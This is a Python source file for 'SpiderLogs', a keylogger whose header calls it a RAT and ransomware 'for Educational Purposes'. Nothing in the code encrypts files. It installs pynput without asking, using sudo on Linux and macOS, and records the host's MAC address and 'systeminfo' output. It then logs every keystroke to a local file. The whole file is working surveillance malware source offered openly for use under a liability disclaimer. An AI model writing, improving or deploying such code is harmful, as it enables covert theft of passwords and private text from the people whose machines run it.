#!/usr/bin/python3
# -*- coding: utf-8 -*-
#!/usr/bin/env python 3
#SpiderLogs V0.3 Source
#Date 1/1/2021 0h00'000

'''
Note: Software RAT(Ransomware Basic) Made by @PTJ312(P3terJ4mes) for Educational Purposes.

The MIT License (MIT)  Copyright (c) 2021 PTJ312(P3terJ4mes)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
--------------------------------------------------------------------------
        *** UPDATE SOURCE CODE EVERY TIME ON THE GITHUB.COM ***
*NOTE: I(PTJ312/P3TERJ4MES) DISCLAIM ANY LIABILITY INCREASING WHEN SOMEONE 
       USERS THE SOFTWARE Breaches THE LAWS OF COUNTRIES AND REGIONAL REGION
'''
import os, logging
import re, subprocess
from uuid import getnode
from sys import platform
try:
    import pynput
    from pynput.keyboard import Key, Listener
except ImportError:
    if platform == "win32":
        try:
            os.system("pip install pynput")
        except:
            os.system("python -m pip install pynput")
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        try:
            os.system("sudo pip install pynput")
        except:
            os.system("python -m pip install pynput")

original_mac_address = getnode()
filenames = "keylogs-"+ str(original_mac_address)+".txt"
def Filenames():
    mac_address = "MAC Address: " + str(original_mac_address)
    hex_mac_address = str(":".join(re.findall('..', '%012x' % original_mac_address)))
    hex_address = "HEX MAC Address: " + str(hex_mac_address)
    with open(filenames,"a",encoding="utf-8") as file:
             file.write("="*25+"System Information"+"="*25+'\n')
             file.write(mac_address+'\n'+hex_address+'\n\n')
             file.close()
Filenames()

def Logfiles():
    log_dir = ""
    logging.basicConfig(filename=(log_dir + filenames), 
                        format='\r%(asctime)s: %(message)s',
                        level=logging.DEBUG,encoding="utf-8")

def SystemInfo():
    system = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    newlogs = []
    for item in system:
        newlogs.append(str(item.split("\r")[:-1]))
    for info in newlogs:
        infosys = str(info[2:-2])
        Logfiles()
        logging.info(str(infosys))
SystemInfo()

def Keyboard(key):
    key = str(key)
    key = key.replace("'","")
    Logfiles()
    logging.info(str(key))
    if key =="Key.esc":
       raise SystemExit(0)
    print(key)

with Listener(on_press=Keyboard) as listener:
     listener.join()
